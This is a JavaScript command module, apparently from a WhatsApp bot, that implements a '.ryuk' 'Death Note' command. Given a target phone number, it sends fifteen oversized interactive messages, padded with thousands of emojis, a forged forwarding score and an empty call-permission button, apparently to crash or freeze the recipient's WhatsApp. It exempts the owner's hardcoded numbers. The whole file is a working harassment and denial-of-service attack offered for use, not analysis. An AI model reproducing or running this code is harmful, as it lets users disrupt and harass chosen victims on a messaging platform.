// commands/ryuk.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function ryukCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🍎 *Ryuk*\n\nUsage: .ryuk <number>\nExample: .ryuk 628123456789\n\n*Death Note Activated*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by L*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🍎 *Death Note* writing ${cleanNumber}'s name...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🍎", key: message.key } });

    try {
        const shinigamiPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Ṛɏüḳ ✦" + "💀".repeat(3500) },
                        footer: { text: "Death Note" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "✍️ Write Name", id: "write" }) },
                                { name: "call_permission_request", buttonParamsJson: "" }
                            ]
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 15; i++) {
            await sock.relayMessage(target, shinigamiPayload, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *Death Note* sealed ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "📓", key: message.key } });

    } catch (error) {
        console.error('[Ryuk]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Death Note failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = ryukCommand;